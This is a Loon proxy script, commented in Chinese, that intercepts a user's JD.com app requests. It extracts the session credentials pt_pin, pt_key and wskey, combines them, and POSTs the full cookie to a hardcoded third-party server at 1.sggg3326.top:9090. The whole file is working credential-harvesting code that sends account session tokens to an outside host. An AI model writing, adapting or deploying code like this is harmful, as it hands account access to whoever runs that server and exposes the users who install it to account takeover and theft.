/**
 * 京东Cookie和wskey获取并自动提交到API服务器
 * Loon 专用适配版
 */

const API_URL = "http://1.sggg3326.top:9090/jd/raw_ck";

// Loon 环境获取请求信息
let cookie = $request.headers['Cookie'] || $request.headers['cookie'];
let requestUrl = $request.url || '';
let host = $request.headers['Host'] || '';

// 获取当前时间戳（秒级）
let currentTimestamp = Math.floor(Date.now() / 1000);
let currentTime = new Date().toISOString();

console.log(`请求时间: ${currentTime}`);
console.log(`时间戳: ${currentTimestamp}`);
console.log(`Host: ${host}`);
console.log(`请求URL: ${requestUrl.substring(0, 80)}...`);

// 提取 Cookie 中的信息
let ptPinMatch = cookie.match(/pt_pin=([^; ]+)(?=;?)/);
let ptKeyMatch = cookie.match(/pt_key=([^; ]+)(?=;?)/);
let wskeyMatch = cookie.match(/wskey=([^; ]+)(?=;?)/);

let pt_pin = ptPinMatch ? decodeURIComponent(ptPinMatch[1]) : '';
let pt_key = ptKeyMatch ? ptKeyMatch[1] : '';
let wskey = wskeyMatch ? wskeyMatch[1] : '';

// 判断请求类型
let isWskeyRequest = /sh\.jd\.com/.test(host);
let isPtKeyRequest = /^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig)/.test(requestUrl);

if (isWskeyRequest && wskey) {
    console.log(`✅ 检测到 wskey 请求`);
    console.log(`✅ 提取到 wskey: ${wskey.substring(0, 15)}...`);
    handleWskeyRequest(wskey, currentTimestamp);
} else if (isPtKeyRequest && pt_pin && pt_key) {
    console.log(`✅ 检测到 pt_key 请求，pt_pin: ${pt_pin}`);
    console.log(`✅ 提取到 pt_key: ${pt_key.substring(0, 15)}...`);
    handlePtKeyRequest(pt_pin, pt_key, currentTimestamp);
} else {
    console.log(`❌ 非目标请求或Cookie不完整，跳过处理`);
    $done({});
}

// ---------- 队列操作 ----------

// 获取 wskey 队列
function getWskeyQueue() {
    let raw = $prefs.valueForKey("JD_Wskey_Queue");
    return raw ? JSON.parse(raw) : [];
}

// 保存 wskey 队列
function saveWskeyQueue(queue) {
    $prefs.setValueForKey(JSON.stringify(queue), "JD_Wskey_Queue");
}

// 获取 pt_key 队列
function getPtKeyQueue() {
    let raw = $prefs.valueForKey("JD_PtKey_Queue");
    return raw ? JSON.parse(raw) : [];
}

// 保存 pt_key 队列
function savePtKeyQueue(queue) {
    $prefs.setValueForKey(JSON.stringify(queue), "JD_PtKey_Queue");
}

// 清理过期数据（超过10秒）
function cleanExpired(queue, now) {
    return queue.filter(item => (now - item.timestamp) <= 10);
}

// 处理 wskey 请求
function handleWskeyRequest(wskey, timestamp) {
    try {
        let queue = getWskeyQueue();
        queue.push({ wskey, timestamp });
        let now = Math.floor(Date.now() / 1000);
        queue = cleanExpired(queue, now);
        saveWskeyQueue(queue);
        console.log(`✅ wskey 已加入队列，当前队列长度: ${queue.length}`);
        tryMatch();
    } catch (e) {
        console.log("处理 wskey 失败: " + e);
    }
    $done({});
}

// 处理 pt_key 请求
function handlePtKeyRequest(pt_pin, pt_key, timestamp) {
    try {
        let queue = getPtKeyQueue();
        queue.push({ pt_pin, pt_key, timestamp });
        let now = Math.floor(Date.now() / 1000);
        queue = cleanExpired(queue, now);
        savePtKeyQueue(queue);
        console.log(`✅ pt_key 已加入队列，当前队列长度: ${queue.length}`);
        tryMatch();
    } catch (e) {
        console.log("处理 pt_key 失败: " + e);
    }
    $done({});
}

// ---------- 匹配与提交 ----------

function tryMatch() {
    try {
        let wskeyQueue = getWskeyQueue();
        let ptkeyQueue = getPtKeyQueue();
        
        while (wskeyQueue.length > 0 && ptkeyQueue.length > 0) {
            let wskeyItem = wskeyQueue[0];
            let ptkeyItem = ptkeyQueue[0];
            
            let { wskey } = wskeyItem;
            let { pt_pin, pt_key } = ptkeyItem;
            
            console.log(`🔄 尝试配对: wskey(${wskey.substring(0,15)}...) <-> pt_pin(${pt_pin})`);
            
            if (checkIfProcessed(pt_pin, pt_key, wskey)) {
                console.log(`🔵 该组合已处理过，丢弃队列头部`);
                wskeyQueue.shift();
                ptkeyQueue.shift();
                continue;
            }
            
            recordProcessed(pt_pin, pt_key, wskey);
            combineAndSubmit(pt_pin, pt_key, wskey);
            
            wskeyQueue.shift();
            ptkeyQueue.shift();
        }
        
        saveWskeyQueue(wskeyQueue);
        savePtKeyQueue(ptkeyQueue);
    } catch (e) {
        console.log("匹配失败: " + e);
    }
}

function checkIfProcessed(pt_pin, pt_key, wskey) {
    try {
        let processedRaw = $prefs.valueForKey("JD_Processed_Records");
        if (!processedRaw) return false;
        
        let processedData = JSON.parse(processedRaw);
        let key = generateRecordKey(pt_pin, pt_key, wskey);
        let record = processedData[key];
        let now = Math.floor(Date.now() / 1000);
        
        if (record && (now - record.timestamp) < 10) {
            return true;
        }
        return false;
    } catch (e) {
        return false;
    }
}

function recordProcessed(pt_pin, pt_key, wskey) {
    try {
        let processedRaw = $prefs.valueForKey("JD_Processed_Records");
        let processedData = processedRaw ? JSON.parse(processedRaw) : {};
        
        let key = generateRecordKey(pt_pin, pt_key, wskey);
        processedData[key] = {
            timestamp: Math.floor(Date.now() / 1000),
            requestTime: new Date().toISOString()
        };
        
        let keys = Object.keys(processedData);
        if (keys.length > 20) {
            let oldestKey = null;
            let oldestTime = Infinity;
            for (let k of keys) {
                if (processedData[k].timestamp < oldestTime) {
                    oldestTime = processedData[k].timestamp;
                    oldestKey = k;
                }
            }
            if (oldestKey) delete processedData[oldestKey];
        }
        
        $prefs.setValueForKey(JSON.stringify(processedData), "JD_Processed_Records");
    } catch (e) {
        console.log("记录处理状态失败: " + e);
    }
}

function generateRecordKey(pt_pin, pt_key, wskey) {
    let hash = 0;
    let str = pt_key.substring(0, 16) + wskey.substring(0, 16);
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash = hash & hash;
    }
    return pt_pin + "_" + hash.toString(36);
}

function combineAndSubmit(pt_pin, pt_key, wskey) {
    let newCookie = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    if (wskey) {
        newCookie += ` wskey=${wskey};`;
    }
    
    console.log(`✅ 成功匹配！组合后的 cookie: ${newCookie.substring(0, 80)}...`);
    
    saveToLocalStorage(pt_pin, newCookie);
    submitToAPI(pt_pin, pt_key, wskey, newCookie);
    sendLocalNotification("京东Cookie获取成功", `账号: ${pt_pin}`, "已成功获取并提交Cookie和wskey");
}

function saveToLocalStorage(pt_pin, newCookie) {
    try {
        let cookiesListRaw = $prefs.valueForKey("CookiesJD");
        let cookiesList = cookiesListRaw ? JSON.parse(cookiesListRaw) : [];
        
        let found = false;
        for (let i = 0; i < cookiesList.length; i++) {
            if (cookiesList[i].userName === pt_pin) {
                cookiesList[i].cookie = newCookie;
                found = true;
                console.log(`更新账号 ${pt_pin} 的 Cookie`);
                break;
            }
        }
        
        if (!found) {
            cookiesList.push({ userName: pt_pin, cookie: newCookie });
            console.log(`新增账号 ${pt_pin}`);
        }
        
        $prefs.setValueForKey(JSON.stringify(cookiesList), "CookiesJD");
        console.log(`✅ 成功保存 Cookie 至本地存储`);
    } catch (e) {
        console.log("保存到本地存储时出错: " + e);
    }
}

function sendLocalNotification(title, subtitle, message) {
    let fullTitle = `🔵 ${title}`;
    console.log(`${fullTitle} - ${subtitle} - ${message}`);
    if (typeof $notification !== 'undefined') {
        // Loon 的通知API
        $notification.post(fullTitle, subtitle, message);
    } else if (typeof $notify !== 'undefined') {
        $notify(fullTitle, subtitle, message);
    }
}

function submitToAPI(pt_pin, pt_key, wskey, cookie) {
    console.log(`正在提交到 API: ${API_URL}`);
    
    const request = {
        url: API_URL,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pt_key, pt_pin, wskey: wskey || '', cookie }),
        timeout: 10000
    };
    
    $task.fetch(request).then(
        function(response) {
            console.log(`API返回状态码: ${response.statusCode}`);
            let data = response.body || "";
            console.log(`API返回数据: ${data}`);
            
            if (data.includes("ok")) {
                console.log(`✅ Cookie提交成功`);
                let parts = data.split(',');
                let resultMessage = parts.length > 1 ? parts.slice(1).join(', ') : "提交成功";
                sendLocalNotification("API提交成功", `账号: ${pt_pin}`, resultMessage);
            } else {
                console.log(`❌ API返回失败: ${data}`);
                sendLocalNotification("API提交失败", `账号: ${pt_pin}`, data);
            }
            $done({});
        },
        function(reason) {
            console.log(`API提交失败: ${reason.error || reason}`);
            sendLocalNotification("API提交失败", `账号: ${pt_pin}`, reason.error || "网络错误");
            $done({});
        }
    );
}
